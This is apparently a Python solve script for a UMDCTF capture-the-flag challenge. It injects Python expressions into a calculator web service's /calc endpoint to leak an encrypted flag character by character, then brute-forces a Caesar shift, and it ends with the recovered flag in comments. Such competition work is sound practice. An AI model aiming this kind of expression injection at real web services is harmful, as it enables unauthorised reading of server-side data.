import requests

url = "https://calculator-beu79.ondigitalocean.app"

c = 0
flag_enc = ""
while True:
    payload = f"flag_enc[{c}].encode()[0]"
    json = {"f":payload}
    resp = requests.post(url= url + "/calc", json= json)
    result_ASCII = resp.text[12:-2]
    c += 1

    if result_ASCII == 0 or result_ASCII == '':
        break

    flag_enc += chr(int(result_ASCII))
    print(result_ASCII)

print(flag_enc, " - encrypted flag")

for i in range(0, 26):
    key = i
    flag = ""
    for c in flag_enc:
            if c.isupper():
                c_index = ord(c) - ord('A')
                c_shifted = (c_index - key) % 26 + ord('A')
                flag += chr(c_shifted)
            elif c.islower():
                c_index = ord(c) - ord('a')
                c_shifted = (c_index - key) % 26 + ord('a')
                flag += chr(c_shifted)
            elif c.isdigit():
                c_new = (int(c) - key) % 10
                flag += str(c_new)
            else:
                flag += c
    if flag[0:6] == "UMDCTF":
        print(f"{flag}  - final flag (key={key})")



# OGXWNZ{q0q_vlon3z0lw3cha_4wno4ffs_q0lem!}  - encrypted flag
# UMDCTF{w6w_brut9f6rc9ing_0ctu0lly_w6rks!}  - final flag